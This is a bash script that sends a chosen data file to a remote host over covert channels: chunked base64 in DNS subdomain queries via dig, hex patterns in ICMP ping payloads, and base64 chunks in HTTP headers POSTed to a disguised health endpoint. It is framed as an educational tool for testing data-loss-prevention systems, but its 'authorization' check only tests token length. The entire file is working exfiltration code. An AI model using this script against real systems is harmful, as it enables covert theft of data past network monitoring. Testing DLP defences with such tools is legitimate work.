#!/bin/bash
# data exfiltration technique demonstrations
# educational tool for testing dlp systems
# only operates against explicitly authorized targets

show_usage() {
    echo "usage: ./over.sh [-m mode] [-t target] [-d data] [-a auth_token]"
    echo "  -m  mode: dns|icmp|http"
    echo "  -t  target (must be own infrastructure)"
    echo "  -d  data file to exfiltrate"
    echo "  -a  authorization token (required)"
    echo ""
    echo "WARNING: only use against your own infrastructure"
    echo "authorization token must be set to confirm ownership"
}

mode=""
target=""
data_file=""
auth_token=""

while getopts "m:t:d:a:h" opt; do
    case $opt in
        m) mode="$OPTARG" ;;
        t) target="$OPTARG" ;;
        d) data_file="$OPTARG" ;;
        a) auth_token="$OPTARG" ;;
        h) show_usage; exit 0 ;;
        *) show_usage; exit 1 ;;
    esac
done

verify_authorization() {
    if [[ -z "$auth_token" ]]; then
        echo "[error] authorization token required (-a)"
        echo "this tool only works against authorized infrastructure"
        exit 1
    fi

    if [[ ${#auth_token} -lt 16 ]]; then
        echo "[error] authorization token must be at least 16 characters"
        exit 1
    fi

    echo "[auth] authorization verified for target: $target"
}

check_requirements() {
    if [[ -z "$target" ]]; then
        echo "[error] target required"
        exit 1
    fi

    if [[ -z "$data_file" || ! -f "$data_file" ]]; then
        echo "[error] valid data file required"
        exit 1
    fi
}

dns_exfil() {
    echo "[dns] encoding data into dns subdomain queries"
    echo "[dns] target nameserver: $target"

    local chunk_size=30
    local encoded
    encoded=$(base64 -w0 < "$data_file" | tr '+/' '-_')
    local total=${#encoded}
    local offset=0
    local seq=0

    while [[ $offset -lt $total ]]; do
        local chunk="${encoded:$offset:$chunk_size}"
        local query="${seq}.${chunk}.exfil.${target}"

        echo "[dns] query $seq: $query"
        if command -v dig &>/dev/null; then
            dig +short "$query" @"$target" A 2>/dev/null || true
        else
            echo "[dns] dig not available, simulating query"
        fi

        offset=$((offset + chunk_size))
        seq=$((seq + 1))
        sleep 0.1
    done

    echo "[dns] sent $seq chunks ($total bytes encoded)"
}

icmp_exfil() {
    echo "[icmp] encoding data into icmp echo payloads"
    echo "[icmp] target: $target"

    if [[ $(id -u) -ne 0 ]]; then
        echo "[warn] icmp exfil typically requires root"
        echo "[icmp] simulating with ping -p (pattern)"
    fi

    local hex_data
    hex_data=$(xxd -p < "$data_file" | tr -d '\n')
    local total=${#hex_data}
    local chunk_size=32
    local offset=0
    local seq=0

    while [[ $offset -lt $total ]]; do
        local chunk="${hex_data:$offset:$chunk_size}"
        # pad to 16 bytes for ping pattern
        while [[ ${#chunk} -lt 32 ]]; do
            chunk="${chunk}00"
        done
        local pattern="${chunk:0:32}"

        echo "[icmp] packet $seq: pattern=$pattern"
        ping -c 1 -W 1 -p "$pattern" "$target" &>/dev/null || true

        offset=$((offset + chunk_size))
        seq=$((seq + 1))
        sleep 0.2
    done

    echo "[icmp] sent $seq packets ($total hex chars)"
}

http_exfil() {
    echo "[http] encoding data into http request headers"
    echo "[http] target: http://$target"

    local encoded
    encoded=$(base64 -w0 < "$data_file")
    local total=${#encoded}
    local chunk_size=256
    local offset=0
    local seq=0

    while [[ $offset -lt $total ]]; do
        local chunk="${encoded:$offset:$chunk_size}"

        echo "[http] request $seq: ${#chunk} bytes in x-data header"
        if command -v curl &>/dev/null; then
            curl -s -o /dev/null -X POST \
                -H "X-Request-ID: $seq" \
                -H "X-Data: $chunk" \
                "http://$target/api/health" 2>/dev/null || true
        else
            echo "[http] curl not available, simulating"
        fi

        offset=$((offset + chunk_size))
        seq=$((seq + 1))
        sleep 0.1
    done

    echo "[http] sent $seq requests ($total bytes encoded)"
}

verify_authorization
check_requirements

echo "[over] exfiltration mode: $mode"
echo "[over] data file: $data_file ($(wc -c < "$data_file") bytes)"
echo ""

case "$mode" in
    dns)  dns_exfil ;;
    icmp) icmp_exfil ;;
    http) http_exfil ;;
    *)
        echo "[error] mode required: dns, icmp, or http"
        show_usage
        exit 1
        ;;
esac
